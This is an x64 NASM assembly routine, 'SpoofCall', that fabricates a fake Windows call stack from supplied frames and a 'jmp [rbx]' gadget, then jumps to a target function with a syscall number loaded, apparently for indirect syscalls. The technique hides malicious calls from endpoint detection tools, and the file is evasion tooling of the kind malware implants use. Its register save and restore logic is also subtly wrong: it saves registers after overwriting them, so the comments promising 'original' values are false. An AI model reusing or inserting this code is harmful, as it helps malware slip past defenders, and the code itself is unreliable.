[BITS 64]

global SpoofCall

;   ULONG      FramesCount;    // 0x00  (padded to 8)
;   FRAME_INFO Frames[8];      // 0x08  (8 * 16 = 0x80 bytes, ends at 0x88)
;   FRAME_INFO Gadget;         // 0x88
;   UPTR       Restore;        // 0x98
;   UPTR       Ssn;            // 0xA0
;   UPTR       Ret;            // 0xA8
;   UPTR       Rbx;            // 0xB0
;   UPTR       Rdi;            // 0xB8
;   UPTR       Rsi;            // 0xC0
;   UPTR       R12;            // 0xC8
;   UPTR       R13;            // 0xD0
;   UPTR       R14;            // 0xD8
;   UPTR       R15;            // 0xE0
;   UPTR       ArgCount;       // 0xE8
;   UPTR       OriginalRsp;    // 0xF0

; Windows x64 calling convention:
;   SpoofCall( Arg1, Arg2, Arg3, Arg4, Fnc, &Setup, Arg5, Arg6, ... )
;              rcx   rdx   r8    r9    [rsp+28] [rsp+30] [rsp+38] [rsp+40] ...
;   (offsets after pop rax: subtract 8 from each stack offset)
;              rcx   rdx   r8    r9    [rsp+20] [rsp+28] [rsp+30] [rsp+38] ...

[SECTION .text$B]
    SpoofCall:
        ; =================================================================
        ; Initial Setup — Windows x64 ABI
        ; =================================================================
        pop rax                         ; real return address -> rax

        ; Save register args (Arg1-4) into callee-saved registers
        ; rcx=Arg1, rdx=Arg2, r8=Arg3, r9=Arg4
        mov r12, rax                    ; save real return address in r12
        mov r13, rcx                    ; save Arg1 in r13
        mov r14, rdx                    ; save Arg2 in r14
        mov r15, r8                     ; save Arg3 in r15

        ; After pop rax, stack args shifted by 8:
        ;   [rsp+0x20] = Fnc
        ;   [rsp+0x28] = &Setup
        ;   [rsp+0x30] = Arg5
        ;   [rsp+0x38] = Arg6
        ;   ...

        mov rsi, [rsp + 0x20]          ; rsi = Fnc (target function)
        mov rdi, [rsp + 0x28]          ; rdi = &Setup (struct pointer)

        ; =================================================================
        ; Save Original Register State
        ; =================================================================
        mov [rdi + 0xB8], rdi           ; save rdi (will be restored)
        mov [rdi + 0xC0], rsi           ; save rsi (will be restored)
        mov [rdi + 0xC8], r12           ; save r12 (has real ret addr)
        mov [rdi + 0xD0], r13           ; save r13 (has Arg1)
        mov [rdi + 0xD8], r14           ; save r14 (has Arg2)
        mov [rdi + 0xE0], r15           ; save r15 (has Arg3)

        ; Also save Arg4 (r9) — we need it later but r9 is volatile
        ; Stash it temporarily in struct Restore field (0x98), will be
        ; moved to r9 before the call
        mov [rdi + 0x98], r9            ; save Arg4 temporarily

        ; =================================================================
        ; Calculate total stack offset for stack argument placement (r14)
        ; r14 = 0x208 + sum(Frames[i].Size) + Gadget.Size - 0x20
        ;
        ; NOTE: We already saved original r14 (Arg2) in struct.
        ;       r13, r14, r15 are now free to use as scratch.
        ; =================================================================
        mov r13, [rdi + 0xE8]           ; ArgCount

        mov r14, 0x208                  ; 0x200 working space + 8 (push 0)

        xor ecx, ecx
        mov r15d, [rdi]                 ; FramesCount
    .calc_offset:
        cmp ecx, r15d
        jge .calc_offset_done
        mov eax, ecx
        shl eax, 4                      ; eax = i * 16
        add r14, [rdi + rax + 0x10]     ; += Frames[i].Size
        inc ecx
        jmp .calc_offset
    .calc_offset_done:
        add r14, [rdi + 0x90]           ; += Gadget.Size
        sub r14, 0x20                   ; subtract shadow space

        lea r10, [rsp + 0x28]           ; r10 = pointer to stack args
                                        ; (Arg5 starts at [rsp+0x30], but
                                        ;  we pre-increment with add r10,8)

        ; =================================================================
        ; Stack Argument Processing Loop
        ; Copies stack args (Arg5..ArgN) to their spoofed positions
        ; =================================================================
        xor r11, r11                    ; processed stack arg counter
    .set_args:
        cmp r11d, r13d
        je .finish

        sub r14, 8                      ; next arg slot offset
        mov r15, rsp
        sub r15, r14                    ; destination address on spoofed stack

        add r10, 8                      ; advance source pointer

        push qword [r10]
        pop  qword [r15]

        add r11, 1
        jmp .set_args

        ; =================================================================
        ; Build Spoofed Call Stack
        ;
        ; Frames[0] = deepest (e.g. RtlUserThreadStart)
        ; Frames[1] = next    (e.g. BaseThreadInitThunk)
        ; ...
        ; Gadget    = top     (closest to RSP)
        ; =================================================================
    .finish:
        ; Save RSP before stack manipulation for clean restore
        mov [rdi + 0xF0], rsp           ; OriginalRsp

        sub rsp, 0x200
        push 0                          ; NULL return (stack terminator)

        ; Build frames 0..N-1 in forward order (deepest first)
        xor ecx, ecx
        mov r15d, [rdi]                 ; FramesCount

    .build_frames:
        cmp ecx, r15d
        jge .build_frames_done

        mov eax, ecx
        shl eax, 4                      ; eax = i * 16

        sub rsp, [rdi + rax + 0x10]     ; sub Frames[i].Size
        mov r11, [rdi + rax + 0x08]     ; Frames[i].Ptr
        mov [rsp], r11                  ; set return address

        inc ecx
        jmp .build_frames

    .build_frames_done:
        ; Build gadget frame on top (closest to RSP)
        sub rsp, [rdi + 0x90]           ; Gadget.Size
        mov r11, [rdi + 0x88]           ; Gadget.Ptr
        mov [rsp], r11                  ; gadget return address

        ; =================================================================
        ; Prepare for Spoofed Call
        ; =================================================================
        mov r11, rsi                    ; r11 = target function address

        mov [rdi + 0xA8], r12           ; store real return address (Ret)
        mov [rdi + 0xB0], rbx           ; preserve original rbx

        ; Gadget is `jmp [rbx]`
        ; rbx -> struct, [struct+0x00] = .restore address
        lea rbx, [rel .restore]
        mov [rdi], rbx                  ; overwrite FramesCount with .restore
        mov rbx, rdi                    ; rbx = struct ptr (callee-saved)

        ; =================================================================
        ; Restore register arguments for the target function call
        ; Windows x64: rcx=Arg1, rdx=Arg2, r8=Arg3, r9=Arg4
        ; =================================================================
        mov rcx, [rdi + 0xD0]          ; rcx = Arg1 (was saved from r13)
        mov rdx, [rdi + 0xD8]          ; rdx = Arg2 (was saved from r14)
        mov r8,  [rdi + 0xE0]          ; r8  = Arg3 (was saved from r15)
        mov r9,  [rdi + 0x98]          ; r9  = Arg4 (was stashed in Restore)

        ; Syscall preparation
        mov r10, rcx                    ; r10 = rcx (syscall convention)
        mov rax, [rbx + 0xA0]          ; load SSN (use rbx since rdi is about to be used)

        jmp r11                         ; jump to target function

        ; =================================================================
        ; Restoration Routine
        ; target ret -> gadget (jmp [rbx]) -> here
        ; =================================================================
    .restore:
        mov rcx, rbx                    ; rcx = struct pointer

        ; Restore RSP directly from saved value
        mov rsp, [rcx + 0xF0]           ; RSP = OriginalRsp (pre-spoof)

        ; Restore all callee-saved registers to their ORIGINAL values
        ; (before SpoofCall was entered)
        mov r12, [rcx + 0xC8]          ; original r12
        mov r13, [rcx + 0xD0]          ; original r13
        mov r14, [rcx + 0xD8]          ; original r14
        mov r15, [rcx + 0xE0]          ; original r15
        mov rdi, [rcx + 0xB8]          ; original rdi
        mov rsi, [rcx + 0xC0]          ; original rsi
        mov rbx, [rcx + 0xB0]          ; original rbx

        ; Return to original caller
        jmp [rcx + 0xA8]